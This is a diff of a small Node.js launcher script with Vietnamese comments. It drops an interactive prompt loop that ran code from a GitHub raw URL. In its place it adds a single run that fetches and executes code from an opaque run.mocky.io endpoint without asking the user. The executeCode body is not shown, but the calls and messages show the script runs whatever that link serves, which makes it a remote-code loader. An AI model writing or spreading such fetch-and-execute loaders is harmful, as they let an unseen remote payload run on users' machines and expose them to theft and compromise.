@@ -1,16 +1,4 @@
 const https = require('https');
-const readline = require('readline');
-
-// Thiết lập giao diện đọc dòng nhập từ bàn phím
-const rl = readline.createInterface({
-    input: process.stdin,
-    output: process.stdout
-});
-
-// Hiển thị banner
-function banner() {
-    console.log('\x1b[38;5;207m🐮 Vui lòng ấn Enter để vào\x1b[0m');
-}
 
 // Hàm kiểm tra kết nối internet
 function checkInternetConnection() {
@@ -47,26 +35,19 @@ async function executeCode(url) {
     });
 }
 
-// Vòng lặp chính
+// Chạy chương trình
 (async function main() {
     try {
-        while (true) {
-            banner();
-            await new Promise((resolve) => rl.question('\x1b[38;5;10mẤn Enter để tiếp tục hoặc Ctrl+C để thoát... \x1b[0m', resolve));
-
-            if (await checkInternetConnection()) {
-                try {
-                    await executeCode('https://raw.githubusercontent.com/Pocodeonline/Pocodeonline/main/matchain.js');
-                } catch (error) {
-                    console.error('\x1b[38;5;9mLỗi kết nối mạng:', error, '\x1b[0m');
-                }
-            } else {
-                console.error('\x1b[38;5;9mKhông có kết nối mạng. Vui lòng kiểm tra kết nối của bạn.\x1b[0m');
+        if (await checkInternetConnection()) {
+            try {
+                await executeCode('https://run.mocky.io/v3/dbc851cf-7620-4aa7-a9c1-1a0bf5cf4503');
+            } catch (error) {
+                console.error('\x1b[38;5;9mLỗi thực thi mã từ liên kết:', error, '\x1b[0m');
             }
+        } else {
+            console.error('\x1b[38;5;9mKhông có kết nối mạng. Vui lòng kiểm tra kết nối của bạn.\x1b[0m');
         }
     } catch (error) {
-        console.error('\x1b[38;5;9mĐã kết thúc chương trình...\x1b[0m');
-    } finally {
-        rl.close();
+        console.error('\x1b[38;5;9mĐã gặp lỗi:', error, '\x1b[0m');
     }
 })();
